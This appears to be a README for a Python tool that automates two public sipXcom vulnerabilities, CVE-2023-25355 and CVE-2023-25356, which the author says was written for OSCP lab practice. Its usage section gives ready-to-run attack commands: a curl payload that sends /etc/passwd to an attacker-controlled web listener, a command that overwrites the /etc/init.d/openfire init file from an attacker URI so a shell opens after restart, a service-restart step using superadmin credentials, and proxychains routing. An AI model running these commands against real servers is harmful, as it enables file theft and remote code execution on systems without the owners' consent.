
# Exploit and credits
The exploit was found by systems.research.group@protonmail.com and is presented both in two amazing pieces:
- [full disclosure article](https://seclists.org/fulldisclosure/2023/Mar/5)
- [DEFCON31 slides](https://media.defcon.org/DEF%20CON%2031/DEF%20CON%2031%20presentations/good%20pseudonym%20-%20Calling%20it%20a%200-Day%20-%20Hacking%20at%20PBXUC%20Systems.pdf)

A repo to automate even more this vulnerability has been published by Alex Linov:
- https://github.com/AlexLinov/sipXcom-RCE

# Objective

The CVE-2023-25355 is an exfiltration mecanism where files on the sipXcom server are uploaded on a webserver controlled by the attacker.

The CVE-2023-25356 is an extension of the first vulnerability where files controlled by the attacker can be written on the sipXcom server filesystem.
Because the sipXcom service is able to overwrite its own init configuration, a shell can therefore be obtained easily as soon as the service is restarted.

The interesting point to note here is that the sipXcom superadmin user is able to restart this service.
Therefore the aim of this package is to fully automatize the restart of this service.

## but why fully automating it ?

To prepare OSCP, there are labs with machines to pwn.

In one specific lab, a machine subject to this vulnerability is/was quite instable, meaning you had sometimes to start and revert the lab several times.
This is annoying. Once automated, this is less annoying.

# Requirements

You need:
- a webserver accessible from the target that is able to serve and/or receive files.
- python and poetry


# Usage

## Install

    poetry install


Then you can either run the tool from active the environment, run it from the directory or elsewhere with the name of the CVE:

    # if the poetry environment is active (poetry shell)
    cve_2023_25355 --help

    # otherwise, from the current directory
    poetry run cve_2023_25355 --help

    # otherwise from another directory
    poetry -C /shared/tools/CVE/CVE-2023-25355 run cve_2023_25355 --help

## CVE-2023-25355

In the following example, we send a payload to exfiltrate the /etc/passwd file that will be uploaded to a controlled http listener.

    cve_2023_25355 \
        --xmpp-username my_username --xmpp-password my_password --xmpp-target-username friend_username \
        --xmpp-server-address 1.2.3.4 \
        --payload '--data-binary @/etc/passwd http://ATTACKER-WEB-LISTENER/some_path'


## CVE-2023-25356

In the following example, we send a payload to overwrite the /etc/init.d/openfire with the content of the provided URI.

    cve_2023_25356 \
        --xmpp-username my_username --xmpp-password my_password --xmpp-target-username friend_username \
        --xmpp-server-address 1.2.3.4 \
        --sipxcom-init-file-source-uri 'http://ATTACKER-WEB-LISTENER/my-offensive-sipx-config'

Then, if we know the superadmin password, we can restart the service to reload the config and trigger any gadget.

    run sipxcom_service_restart \
        --sipxcom-superuser-username superadmin \
        --sipxcom-superuser-password superadmin_password \
        --sipxcom-website https://1.2.3.4/
        --debug-local-directory /tmp


## Combined with proxychains

    ./proxychains4 -f proxychains.conf cve_2023_25355 [...] --xmpp-server-address 172.1.2.3

Project:
- https://github.com/rofl0r/proxychains-ng
